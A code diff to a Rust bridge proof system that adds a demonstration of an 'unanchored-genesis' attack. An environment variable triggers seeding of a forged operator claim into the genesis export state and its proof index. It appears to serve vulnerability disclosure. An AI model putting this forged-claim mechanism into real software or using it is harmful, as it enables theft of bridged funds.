@@ -26,6 +26,9 @@ use moho_runtime_interface::MohoProgram;
 use moho_types::{ExportState, MohoState};
 use strata_asm_common::{AnchorState, AsmLogEntry, AsmManifest, AsmManifestHash, AuxData};
 use strata_asm_logs::NewExportEntry;
+// DEMO ONLY: forged genesis claim seeding (unanchored-genesis attack).
+use strata_asm_proto_bridge_v1::OperatorClaimUnlock;
+use strata_asm_proto_bridge_v1_txs::BRIDGE_V1_SUBPROTOCOL_ID;
 use strata_asm_proof_db::SledMohoStateDb;
 use strata_asm_proof_impl::moho_program::program::{
     AsmStfProgram, advance_export_state_with_logs, extract_next_predicate_from_logs,
@@ -286,6 +289,20 @@ impl AnchorStateStore for AsmWorkerContext {
         // Index each `NewExportEntry` alongside the MohoState's compact MMR so
         // the RPC can regenerate inclusion proofs later.
         if let Some(ref export_entries_db) = self.export_entries_db {
+            // DEMO ONLY (unanchored-genesis): the forged genesis claim is planted
+            // straight into the genesis MohoState export MMR (see
+            // construct_genesis_moho_state), not emitted as a NewExportEntry log.
+            // Mirror it into the export-entries index so the RPC can build its
+            // inclusion proof — otherwise find_index misses it and returns None.
+            if blockid.height() as u64 == self.genesis_height {
+                if let Some((deposit_idx, operator_idx)) = forged_genesis_claim() {
+                    let leaf = OperatorClaimUnlock::new(deposit_idx, operator_idx).compute_hash();
+                    export_entries_db
+                        .append(BRIDGE_V1_SUBPROTOCOL_ID, blockid.height(), leaf)
+                        .map_err(|_| WorkerError::DbError)?;
+                }
+            }
+
             for log in state.logs() {
                 if let Ok(export) = log.try_into_log::<NewExportEntry>() {
                     export_entries_db
@@ -364,8 +381,26 @@ fn construct_genesis_moho_state(
     genesis_anchor_state: &AnchorState,
 ) -> MohoState {
     let inner = AsmStfProgram::compute_state_commitment(genesis_anchor_state);
-    let export_state = ExportState::new(vec![]).expect("empty export state is always valid");
+    let mut export_state = ExportState::new(vec![]).expect("empty export state is always valid");
+
+    // DEMO ONLY (unanchored-genesis attack): when FORGE_GENESIS_CLAIM is set, plant a
+    // forged OperatorClaimUnlock leaf in the genesis bridge-v1 MMR. The bridge proof never
+    // anchors the Moho genesis, so a proof built from this seeded genesis still verifies.
+    if let Some((deposit_idx, operator_idx)) = forged_genesis_claim() {
+        let leaf = OperatorClaimUnlock::new(deposit_idx, operator_idx).compute_hash();
+        export_state
+            .add_entry(BRIDGE_V1_SUBPROTOCOL_ID, leaf)
+            .expect("failed to seed forged genesis claim");
+    }
+
     MohoState::new(inner, asm_predicate, export_state)
+}
+
+/// DEMO ONLY: parse `FORGE_GENESIS_CLAIM=<deposit_idx>:<operator_idx>`; `None` when unset/malformed.
+fn forged_genesis_claim() -> Option<(u32, u32)> {
+    let spec = std::env::var("FORGE_GENESIS_CLAIM").ok()?;
+    let (deposit, operator) = spec.split_once(':')?;
+    Some((deposit.trim().parse().ok()?, operator.trim().parse().ok()?))
 }
 
 /// Chain-forward the [`MohoState`]: let STF logs drive predicate and export
